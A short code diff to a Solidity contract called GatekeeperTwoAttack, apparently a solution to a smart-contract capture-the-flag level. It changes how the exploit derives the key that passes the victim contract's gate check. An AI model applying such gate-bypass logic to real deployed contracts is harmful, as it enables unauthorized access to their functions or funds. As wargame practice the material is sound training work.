@@ -9,7 +9,7 @@ contract GatekeeperTwoAttack {
         require(
             victimGatekeeperTwo.enter(
                 bytes8(
-                    uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^
+                    uint64(bytes8(keccak256(abi.encodePacked(this)))) ^
                         type(uint64).max
                 )
             ),
